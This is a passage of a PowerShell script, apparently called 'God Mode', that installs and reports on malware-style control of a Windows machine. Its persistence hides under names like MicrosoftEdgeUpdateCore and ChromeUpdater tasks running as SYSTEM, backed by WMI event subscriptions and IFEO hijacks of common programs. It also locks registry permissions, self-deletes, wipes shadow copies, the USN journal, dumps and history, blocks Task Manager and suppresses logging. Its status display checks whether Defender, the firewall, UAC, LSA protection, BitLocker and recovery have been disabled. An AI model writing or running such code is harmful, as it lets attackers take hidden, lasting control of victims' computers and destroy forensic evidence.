        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Registry persistence keys set." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to set registry persistence: $_" -Type "WARN" -Color Yellow }

    # --- Multi-layer task redundancy (backup task names) ---
    Write-Log -Message "Registering backup persistence tasks..." -Type "INFO" -Color Gray
    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_")
    foreach ($Prefix in $BackupPrefixes) {
        try {
            # Skip if any task with this prefix already exists (idempotent)
            if (Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue) {
                Write-Log -Message "Backup task prefix $Prefix already exists; skipping." -Type "INFO" -Color Gray
                continue
            }
            $taskName = $Prefix + (Get-Random -Minimum 10000 -Maximum 99999)
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
            Write-Log -Message "Backup task $taskName registered." -Type "INFO" -Color Gray
        } catch { Write-Log -Message "Backup task $Prefix failed: $_" -Type "WARN" -Color Yellow }
    }

    # --- Self-protection: harden flag registry key ---
    try {
        if (Test-Path $GodModeFlagRegPath) {
            $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
            if ($RegKey) {
                $Acl = $RegKey.GetAccessControl()
                $Acl.SetAccessRuleProtection($true, $false)
                $Acl.Access | ForEach-Object { $Acl.RemoveAccessRule($_) | Out-Null }
                $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
                $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidAdmin, "ReadKey", "ContainerInherit,ObjectInherit", "None", "Allow")))
                $RegKey.SetAccessControl($Acl)
                $RegKey.Close()
            }
        }
    } catch { Write-Log -Message "Flag registry self-protection failed: $_" -Type "WARN" -Color Yellow }

    # --- WMI persistence (file-less fallback) ---
    Register-GodModeWMI

    # --- Self-destruct: delete original script from disk after persistence is set ---
    Invoke-SelfDestruct -Path $PSCommandPath

    # --- Anti-forensics: clear traces ---
    Write-Log -Message "Running anti-forensics cleanup..." -Type "INFO" -Color Gray
    Clear-ShadowCopies
    Clear-USNJournal
    Clear-CrashDumps
    Clear-PowerShellHistory
    Clear-RecentTraces

    # --- Deep persistence: harder to remove ---
    Register-DeepPersistence

    # --- Stealth mode: harder to detect ---
    Invoke-StealthMode

    # --- Event-driven WMI process creation watcher for fast elevation ---
    Register-ProcessCreationWatcher | Out-Null

    # --- SYSTEM watchdog: relaunch as SYSTEM if monitoring is killed ---
    Register-SystemWatchdog

    # --- Install IFEO elevation for normal user programs (chrome, notepad, regedit,
    #     mstsc, office, dev tools, etc.) so any launch of them is born as SYSTEM via
    #     gmproxy.exe. Runs in the fresh-activation section; the IFEO registry keys
    #     persist across reboots, and gmproxy.exe is re-copied each boot by
    #     Install-ProcessHook (which runs before the idempotency skip). ---
    Install-IfeoElevation

    # --- Block Task Manager to prevent manual process termination ---
    Block-TaskManager


    Write-Log -Message "God Mode ENABLED" -Type "WARN" -Color Yellow
    Write-DebugLog -FunctionName "Enable-GodMode" -Action "EXIT" -Message "Success"
}

function Disable-GodMode {
    Write-DebugLog -FunctionName "Disable-GodMode" -Action "ENTRY"
    Remove-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
    Unregister-StealthTask
    Unregister-ProcessCreationWatcher
    Stop-GmProxyFeedbackListener
    Stop-IfeoNewAppWatcher
    Unregister-SystemWatchdog
    Unblock-TaskManager

    # --- Uninstall C process hook ---
    Uninstall-ProcessHook

    # --- Remove IFEO elevation for normal user programs (hardened keys) ---
    Uninstall-IfeoElevation

    # --- Remove backup task prefixes ---
    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_", $GodModeTaskPrefix)
    foreach ($Prefix in $BackupPrefixes) {
        try {
            Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue |
                Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        } catch { }
    }

    # --- Remove registry persistence ---
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove registry persistence: $_" -Type "WARN" -Color Yellow }

    Disable-DangerousMode

    # --- Restore flag registry key ACL so it can be re-enabled later ---
    try {
        if (Test-Path $GodModeFlagRegPath) {
            $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
            if ($RegKey) {
                $Acl = $RegKey.GetAccessControl()
                $Acl.SetAccessRuleProtection($false, $false)
                $Acl.Access | ForEach-Object { $Acl.RemoveAccessRule($_) | Out-Null }
                $RegKey.SetAccessControl($Acl)
                $RegKey.Close()
            }
        }
    } catch { Write-Log -Message "Flag registry ACL restore failed: $_" -Type "WARN" -Color Yellow }

    # --- Cleanup WMI persistence ---
    try {
        $WmiName = "Win32ProviderHealthCheck"
        Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='$WmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='$WmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "__PATH LIKE '%$WmiName%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Write-Log -Message "WMI persistence removed." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "WMI cleanup failed: $_" -Type "WARN" -Color Yellow }

    # --- Cleanup deep persistence WMI ---
    try {
        $DeepWmiName = "Win32BootHealthCheck"
        Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='$DeepWmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='$DeepWmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "__PATH LIKE '%$DeepWmiName%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Write-Log -Message "Deep persistence WMI removed." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Deep persistence WMI cleanup failed: $_" -Type "WARN" -Color Yellow }

    Write-Log -Message "God Mode DISABLED" -Type "WARN" -Color Yellow
    Write-DebugLog -FunctionName "Disable-GodMode" -Action "EXIT" -Message "Success"
}

function Show-GodModeStatus {
    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " GOD MODE STATUS DETAIL                    " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray

    # Current user identity
    $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $IsAdmin = ([Security.Principal.WindowsPrincipal]$CurrentUser).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $IsBuiltIn = ($CurrentUser.User.Value -like "*-500")
    Write-Host "  Current User            : $($CurrentUser.Name)" -ForegroundColor White
    Write-Host "  User SID                : $($CurrentUser.User.Value)" -ForegroundColor White
    if ($IsBuiltIn) {
        Write-Host "  Built-in Administrator  : YES" -ForegroundColor Red
    } else {
        Write-Host "  Built-in Administrator  : NO" -ForegroundColor Yellow
    }
    if ($IsAdmin) {
        Write-Host "  Admin Privileges        : YES" -ForegroundColor Yellow
    } else {
        Write-Host "  Admin Privileges        : NO" -ForegroundColor Red
    }
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    # Core God Mode state
    $Flag = Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
    if ($Flag -and $Flag.$GodModeFlagRegName -eq 1) {
        Write-Host "  God Mode State          : ACTIVE" -ForegroundColor Red
    } else {
        Write-Host "  God Mode State          : INACTIVE" -ForegroundColor Green
    }

    # Stealth task status
    # Main God Mode tasks
    $MainTask = Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue
    $GuardianTask = Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue
    if ($MainTask -and $GuardianTask) {
        Write-Host "  Main Task + Guardian    : INSTALLED" -ForegroundColor Cyan
    } elseif ($MainTask -or $GuardianTask) {
        Write-Host "  Main Task + Guardian    : PARTIAL (1 missing)" -ForegroundColor Yellow
    } else {
        Write-Host "  Main Task + Guardian    : NOT INSTALLED" -ForegroundColor DarkGray
    }

    $StealthTasks = Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue
    if ($StealthTasks) {
        Write-Host "  Stealth Task            : INSTALLED ($($StealthTasks.Count) found)" -ForegroundColor Cyan
    } else {
        Write-Host "  Stealth Task            : NOT INSTALLED" -ForegroundColor DarkGray
    }

    # Watchdog status
    $Watchdog = Get-ScheduledTask -TaskName $GodModeWatchdogName -ErrorAction SilentlyContinue
    if ($Watchdog) {
        Write-Host "  Watchdog                : INSTALLED ($($Watchdog.State))" -ForegroundColor Cyan
    } else {
        Write-Host "  Watchdog                : NOT INSTALLED" -ForegroundColor DarkGray
    }

    # Task Manager block status
    $TaskMgrBlocked = $false
    $IfeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"
    if (Test-Path $IfeoPath) {
        $Debugger = (Get-ItemProperty -Path $IfeoPath -Name "Debugger" -ErrorAction SilentlyContinue).Debugger
        if ($Debugger) { $TaskMgrBlocked = $true }
    }
    $PolicyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    $DisableTaskMgr = (Get-ItemProperty -Path $PolicyPath -Name "DisableTaskMgr" -ErrorAction SilentlyContinue).DisableTaskMgr
    if ($DisableTaskMgr -eq 1) { $TaskMgrBlocked = $true }
    if ($TaskMgrBlocked) {
        Write-Host "  Task Manager            : BLOCKED" -ForegroundColor Red
    } else {
        Write-Host "  Task Manager            : UNBLOCKED" -ForegroundColor Green
    }

    # Compiler / build-tool availability
    $CompilerStatus = Get-CompilerStatus
    if ($CompilerStatus -eq "MSYS2-FOUND-NO-GCC") {
        Write-Host "  C Compiler              : MSYS2 FOUND (auto-install available via option 7)" -ForegroundColor Yellow
    } elseif ($CompilerStatus) {
        Write-Host "  C Compiler              : AVAILABLE ($CompilerStatus)" -ForegroundColor Green
    } else {
        Write-Host "  C Compiler              : NOT FOUND (Option 7 auto-build will fail)" -ForegroundColor Yellow
    }

    # Process hook (IFEO proxy + explorer DLL) status
    $HookIfeo = $false
    $HookDll = $false
    $IfeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
    $TargetApps = @("chrome.exe", "firefox.exe", "msedge.exe", "notepad.exe", "cmd.exe", "powershell.exe")
    foreach ($app in $TargetApps) {
        $appPath = Join-Path $IfeoPath $app
        if (Test-Path $appPath) {
            $Debugger = (Get-ItemProperty -Path $appPath -Name "Debugger" -ErrorAction SilentlyContinue).Debugger
            if ($Debugger -and $Debugger -like "*gmproxy.exe*") { $HookIfeo = $true; break }
        }
    }
    $HookDllPath = Join-Path $GodModeInstallDir "gmhook.dll"
    if (Test-Path $HookDllPath) { $HookDll = $true }
    if ($HookIfeo -and $HookDll) {
        Write-Host "  Process Hook            : INSTALLED (IFEO + DLL)" -ForegroundColor Cyan
    } elseif ($HookIfeo -or $HookDll) {
        Write-Host "  Process Hook            : PARTIAL (IFEO=$HookIfeo, DLL=$HookDll)" -ForegroundColor Yellow
    } else {
        Write-Host "  Process Hook            : NOT INSTALLED" -ForegroundColor DarkGray
    }

    # Defender processes
    $DefenderProcs = @("MsMpEng", "MsMpEngCP", "MpDefenderCoreService", "MsSense", "smartscreen", "SecurityHealthService")
    $RunningDefender = 0
    foreach ($proc in $DefenderProcs) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) { $RunningDefender++ }
    }
    if ($RunningDefender -eq 0) {
        Write-Host "  Defender Processes      : ALL STOPPED ($RunningDefender/$($DefenderProcs.Count))" -ForegroundColor Green
    } else {
        Write-Host "  Defender Processes      : $RunningDefender RUNNING ($($DefenderProcs.Count) total)" -ForegroundColor Red
    }

    # Defender services
    $DefenderSvcs = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
    $RunningSvcs = 0
    foreach ($svc in $DefenderSvcs) {
        $svcObj = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($svcObj -and $svcObj.Status -eq 'Running') { $RunningSvcs++ }
    }
    if ($RunningSvcs -eq 0) {
        Write-Host "  Defender Services       : ALL STOPPED ($RunningSvcs/$($DefenderSvcs.Count))" -ForegroundColor Green
    } else {
        Write-Host "  Defender Services       : $RunningSvcs RUNNING ($($DefenderSvcs.Count) total)" -ForegroundColor Red
    }

    # Real-time monitoring
    try {
        $MpPref = Get-MpPreference -ErrorAction SilentlyContinue
        if ($MpPref -and $MpPref.DisableRealtimeMonitoring) {
            Write-Host "  Real-Time Monitoring    : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  Real-Time Monitoring    : ENABLED (or indeterminate)" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Real-Time Monitoring    : UNKNOWN (Get-MpPreference failed)" -ForegroundColor DarkGray
    }

    # Firewall
    $FirewallProfiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue
    $FwEnabled = 0
    foreach ($fp in $FirewallProfiles) {
        if ($fp.Enabled) { $FwEnabled++ }
    }
    if ($FwEnabled -eq 0) {
        Write-Host "  Windows Firewall        : ALL PROFILES OFF" -ForegroundColor Green
    } else {
        Write-Host "  Windows Firewall        : $FwEnabled/$(($FirewallProfiles | Measure-Object).Count) PROFILES ON" -ForegroundColor Red
    }

    # UAC / LUA
    try {
        $lua = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -ErrorAction SilentlyContinue
        if ($lua -and $lua.EnableLUA -eq 0) {
            Write-Host "  UAC (LUA)               : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  UAC (LUA)               : ENABLED" -ForegroundColor Red
        }
    } catch {
        Write-Host "  UAC (LUA)               : UNKNOWN" -ForegroundColor DarkGray
    }

    # Windows Update
    try {
        $wu = Get-Service -Name "wuauserv" -ErrorAction SilentlyContinue
        if ($wu -and $wu.Status -eq 'Running') {
            Write-Host "  Windows Update Service  : RUNNING" -ForegroundColor Red
        } else {
            Write-Host "  Windows Update Service  : STOPPED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Windows Update Service  : UNKNOWN" -ForegroundColor DarkGray
    }

    # WMI Persistence
    try {
        $WmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='Win32ProviderHealthCheck'" -ErrorAction SilentlyContinue
        if ($WmiFilter) {
            Write-Host "  WMI Persistence         : ACTIVE (file-less fallback)" -ForegroundColor Red
        } else {
            Write-Host "  WMI Persistence         : NOT ACTIVE" -ForegroundColor Green
        }
    } catch {
        Write-Host "  WMI Persistence         : UNKNOWN" -ForegroundColor DarkGray
    }

    # Safe Mode / Recovery
    try {
        $BcdOutput = bcdedit /enum {current} 2>$null | Out-String
        $SafeModeBlocked = ($BcdOutput -match "safeboot\s+minimal")
        $ReBlocked = ($BcdOutput -match "recoveryenabled\s+No")
        if ($SafeModeBlocked -and $ReBlocked) {
            Write-Host "  Safe Mode / Recovery    : BLOCKED (BCD hardened)" -ForegroundColor Red
        } elseif ($SafeModeBlocked -or $ReBlocked) {
            Write-Host "  Safe Mode / Recovery    : PARTIALLY BLOCKED" -ForegroundColor Yellow
        } else {
            Write-Host "  Safe Mode / Recovery    : AVAILABLE" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Safe Mode / Recovery    : UNKNOWN" -ForegroundColor DarkGray
    }

    # ELAM
    try {
        $Elam = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -ErrorAction SilentlyContinue
        if ($Elam -and $Elam.DriverLoadPolicy -eq 3) {
            Write-Host "  ELAM Boot Drivers       : UNKNOWN ALLOWED" -ForegroundColor Red
        } else {
            Write-Host "  ELAM Boot Drivers       : ENFORCED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  ELAM Boot Drivers       : UNKNOWN" -ForegroundColor DarkGray
    }

    # Security Center Alerts
    try {
        $ScAlert = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -ErrorAction SilentlyContinue
        if ($ScAlert -and $ScAlert.DisableNotifications -eq 1) {
            Write-Host "  Security Center Alerts  : SUPPRESSED" -ForegroundColor Red
        } else {
            Write-Host "  Security Center Alerts  : ACTIVE" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Security Center Alerts  : UNKNOWN" -ForegroundColor DarkGray
    }

    # Event Logging
    try {
        $EvtSvc = Get-Service -Name "EventLog" -ErrorAction SilentlyContinue
        if ($EvtSvc -and $EvtSvc.Status -eq 'Running') {
            Write-Host "  Event Logging           : RUNNING" -ForegroundColor Green
        } else {
            Write-Host "  Event Logging           : STOPPED / CLEARED" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Event Logging           : UNKNOWN" -ForegroundColor DarkGray
    }

    # UAC Prompts
    try {
        $UacPrompt = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -ErrorAction SilentlyContinue
        if ($UacPrompt -and $UacPrompt.ConsentPromptBehaviorAdmin -eq 0) {
            Write-Host "  UAC Prompts             : SILENT (No Elevation Prompt)" -ForegroundColor Red
        } else {
            Write-Host "  UAC Prompts             : PROMPTING" -ForegroundColor Green
        }
    } catch {
        Write-Host "  UAC Prompts             : UNKNOWN" -ForegroundColor DarkGray
    }

    # SmartScreen
    try {
        $SsReg = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -ErrorAction SilentlyContinue
        if ($SsReg -and $SsReg.EnableSmartScreen -eq 0) {
            Write-Host "  SmartScreen             : DISABLED (Registry)" -ForegroundColor Red
        } else {
            Write-Host "  SmartScreen             : ENABLED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  SmartScreen             : UNKNOWN" -ForegroundColor DarkGray
    }

    # Remote UAC
    try {
        $Ruac = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -ErrorAction SilentlyContinue
        if ($Ruac -and $Ruac.LocalAccountTokenFilterPolicy -eq 1) {
            Write-Host "  Remote UAC              : DISABLED (Full Admin Tokens)" -ForegroundColor Red
        } else {
            Write-Host "  Remote UAC              : ENABLED (Filtered)" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Remote UAC              : UNKNOWN" -ForegroundColor DarkGray
    }

    # Credential Guard / VBS
    try {
        $Vbs = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue
        if ($Vbs -and $Vbs.EnableVirtualizationBasedSecurity -eq 0) {
            Write-Host "  Credential Guard / VBS  : DISABLED" -ForegroundColor Red
        } else {
            Write-Host "  Credential Guard / VBS  : ENABLED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Credential Guard / VBS  : UNKNOWN" -ForegroundColor DarkGray
    }

    # Windows Script Host
    try {
        $Wsh = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -ErrorAction SilentlyContinue
        if ($Wsh -and $Wsh.Enabled -eq 0) {
            Write-Host "  Windows Script Host     : DISABLED" -ForegroundColor Red
        } else {
            Write-Host "  Windows Script Host     : ENABLED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Windows Script Host     : UNKNOWN" -ForegroundColor DarkGray
    }

    # Defender Exclusions
    try {
        $Exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath -ErrorAction SilentlyContinue
        if ($Exclusions -and ($Exclusions -contains $GodModeInstallDir -or $Exclusions -contains $PSCommandPath)) {
            Write-Host "  Defender Exclusions     : SELF-WHITELISTED" -ForegroundColor Red
        } else {
            Write-Host "  Defender Exclusions     : NOT WHITELISTED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Defender Exclusions     : UNKNOWN" -ForegroundColor DarkGray
    }

    # File-less / Self-Destruct
    try {
        if (Test-Path $PSCommandPath) {
            Write-Host "  Original Payload        : ON DISK" -ForegroundColor Green
        } else {
            Write-Host "  Original Payload        : SELF-DESTRUCTED (file-less)" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Original Payload        : UNKNOWN" -ForegroundColor DarkGray
    }

    # Stealth Mode
    try {
        $Sbl = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -ErrorAction SilentlyContinue
        $Trans = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -ErrorAction SilentlyContinue
        $ModLog = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -ErrorAction SilentlyContinue
        if (($Sbl -and $Sbl.EnableScriptBlockLogging -eq 0) -and ($Trans -and $Trans.EnableTranscripting -eq 0) -and ($ModLog -and $ModLog.EnableModuleLogging -eq 0)) {
            Write-Host "  Stealth Mode            : ACTIVE (Logging suppressed)" -ForegroundColor Green
        } else {
            Write-Host "  Stealth Mode            : INACTIVE" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Stealth Mode            : UNKNOWN" -ForegroundColor DarkGray
    }

    # Deep Persistence
    try {
        $DeepReg1 = Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -ErrorAction SilentlyContinue
        $DeepReg2 = Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -ErrorAction SilentlyContinue
        $DeepTaskCount = 0
        foreach ($Prefix in @("WindowsDefenderSigUpdates_*", "OneDriveStandaloneUpdater_*", "EdgeWebView2Updater_*")) {
            $DeepTaskCount += (Get-ScheduledTask -TaskName $Prefix -ErrorAction SilentlyContinue | Measure-Object).Count
        }
        $DeepWmi = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='Win32BootHealthCheck'" -ErrorAction SilentlyContinue
        if ($DeepReg1 -or $DeepReg2 -or $DeepTaskCount -gt 0 -or $DeepWmi) {
            $Color = if ($DeepTaskCount -gt 5) { "Yellow" } else { "Green" }
            Write-Host "  Deep Persistence        : ACTIVE ($DeepTaskCount tasks, WMI:$([bool]$DeepWmi))" -ForegroundColor $Color
        } else {
            Write-Host "  Deep Persistence        : NOT ACTIVE" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Deep Persistence        : UNKNOWN" -ForegroundColor DarkGray
    }

    # Broader Security Subsystems
    # AppLocker
    try {
        $AppL = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -Name "EnforcementMode" -ErrorAction SilentlyContinue
        if ($AppL -and $AppL.EnforcementMode -eq 0) {
            Write-Host "  AppLocker               : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  AppLocker               : ENFORCED" -ForegroundColor Red
        }
    } catch { Write-Host "  AppLocker               : UNKNOWN" -ForegroundColor DarkGray }

    # Windows Sandbox / HVCI
    try {
        $Hvci = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -ErrorAction SilentlyContinue
        if ($Hvci -and $Hvci.Enabled -eq 0) {
            Write-Host "  Windows Sandbox / HVCI  : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  Windows Sandbox / HVCI  : ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  Windows Sandbox / HVCI  : UNKNOWN" -ForegroundColor DarkGray }

    # LSA Protection
    try {
        $LsaPPL = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue
        if ($LsaPPL -and $LsaPPL.RunAsPPL -eq 0) {
            Write-Host "  LSA Protection          : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  LSA Protection          : ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  LSA Protection          : UNKNOWN" -ForegroundColor DarkGray }

    # BitLocker
    try {
        $BlOn = Get-BitLockerVolume -ErrorAction SilentlyContinue | Where-Object { $_.ProtectionStatus -eq 'On' }
        if ($BlOn) {
            Write-Host "  BitLocker               : PROTECTED (On)" -ForegroundColor Red
        } else {
            Write-Host "  BitLocker               : SUSPENDED / OFF" -ForegroundColor Green
        }
    } catch { Write-Host "  BitLocker               : UNKNOWN" -ForegroundColor DarkGray }

    # ASR
    try {
        $Asr = Get-MpPreference -ErrorAction SilentlyContinue
        if ($Asr -and ($Asr.AttackSurfaceReductionRules_Actions -eq $null -or $Asr.AttackSurfaceReductionRules_Actions.Count -eq 0)) {
            Write-Host "  ASR Rules               : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  ASR Rules               : ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  ASR Rules               : UNKNOWN" -ForegroundColor DarkGray }

    # Controlled Folder Access
    try {
        $Cfa = Get-MpPreference -ErrorAction SilentlyContinue
        if ($Cfa -and $Cfa.EnableControlledFolderAccess -eq 'Disabled') {
            Write-Host "  Controlled Folder Access: DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  Controlled Folder Access: ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  Controlled Folder Access: UNKNOWN" -ForegroundColor DarkGray }

    # Exploit Guard / Network Protection
    try {
        $Np = Get-MpPreference -ErrorAction SilentlyContinue
        if ($Np -and ($Np.EnableNetworkProtection -eq 'AuditMode' -or $Np.EnableNetworkProtection -eq 0)) {
            Write-Host "  Exploit Guard / NetProt : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  Exploit Guard / NetProt : ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  Exploit Guard / NetProt : UNKNOWN" -ForegroundColor DarkGray }

    # Anti-Forensics
    try {
        $Shadows = (& vssadmin list shadows 2>$null) | Out-String
        $ShadowsCleared = ($Shadows -notmatch "Shadow Copy")
        $UsnCleared = $false
        try { $Usn = (& fsutil usn queryjournal C: 2>$null); if (-not $Usn) { $UsnCleared = $true } } catch { $UsnCleared = $true }
        $DumpsExist = (Test-Path "C:\Windows\Minidump\*") -or (Test-Path "C:\Windows\Memory.dmp")
        $HistPath = $null
        try { $HistPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath } catch {}
        $HistoryExists = $HistPath -and (Test-Path $HistPath)
        $RecentExists = (Test-Path "$env:APPDATA\Microsoft\Windows\Recent\*")
        if ($ShadowsCleared -and $UsnCleared -and -not $DumpsExist -and -not $HistoryExists -and -not $RecentExists) {
            Write-Host "  Anti-Forensics          : CLEARED (Shadows, USN, Dumps, History, Recent)" -ForegroundColor Green
        } else {
            $AFParts = @()
            if (-not $ShadowsCleared) { $AFParts += "Shadows" }
            if (-not $UsnCleared) { $AFParts += "USN" }
            if ($DumpsExist) { $AFParts += "Dumps" }
            if ($HistoryExists) { $AFParts += "History" }
            if ($RecentExists) { $AFParts += "Recent" }
            Write-Host "  Anti-Forensics          : PARTIAL (present: $($AFParts -join ', '))" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "  Anti-Forensics          : UNKNOWN" -ForegroundColor DarkGray
    }

    # Registry ACL Hardening (representative check)
    try {
        $RepKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        $HasDeny = $false
        if (Test-Path $RepKey) {
